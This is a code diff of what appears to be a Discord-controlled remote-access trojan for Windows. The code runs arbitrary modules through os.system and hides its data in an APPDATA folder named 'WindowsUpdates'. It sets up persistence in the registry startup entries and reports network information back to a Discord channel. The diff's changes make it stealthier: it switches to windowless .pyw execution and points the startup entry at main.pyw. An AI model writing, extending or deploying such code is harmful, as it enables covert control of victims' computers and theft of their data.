@@ -18,31 +18,28 @@ import gzip
 
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
-#boot_path = os.getenv("APPDATA") + "\Microsoft\Windows\Start Menu\Programs\Startup"
-
-
 
 def load_modules():
     for module in os.listdir(modules_path):
-        if module.endswith(".py"):
+        if module.endswith(".py") or module.endswith(".pyw"):
             print(f"py {modules_path}\{module}")
             os.system(f"py {modules_path}\{module}")
 
 def load_module(module):
-    if module.endswith(".py"):
+    if module.endswith(".py") or module.endswith(".pyw"):
         print(f"py {modules_path}\{module}")
         os.system(f"py {modules_path}\{module}")
 
 def list_modules():
     modules = ""
     for module in os.listdir(modules_path):
-        if module.endswith(".py"):
+        if module.endswith(".py") or module.endswith(".pyw"):
             modules += module + "\n"
     return modules
 
 @client.event
 async def on_ready():
-    print(f"Bot started. Version: " + "1.0.6")
+    print(f"Bot started. Version: " + "1.0.0")
     if os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates") == False:
         os.mkdir(f"{os.getenv('APPDATA')}\\WindowsUpdates")
 
@@ -399,7 +396,7 @@ async def on_message(message):
             reg_h.store_enc_key()
             embed = discord.Embed(title="Setup", description="Encryption key stored.", color=0x00ff00)
             await message.channel.send(embed=embed)
-            reg_h.create_startup(f"{os.path.dirname(os.path.abspath(__file__))}\\main.py")
+            reg_h.create_startup(f"{os.path.dirname(os.path.abspath(__file__))}\\main.pyw")
             embed = discord.Embed(title="Setup", description="Startup created.", color=0x00ff00)
             await message.channel.send(embed=embed)
         except Exception as e:
@@ -425,4 +422,3 @@ async def on_message(message):
         os.remove("networking_info.txt")
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
-#use py main.py <token> to run
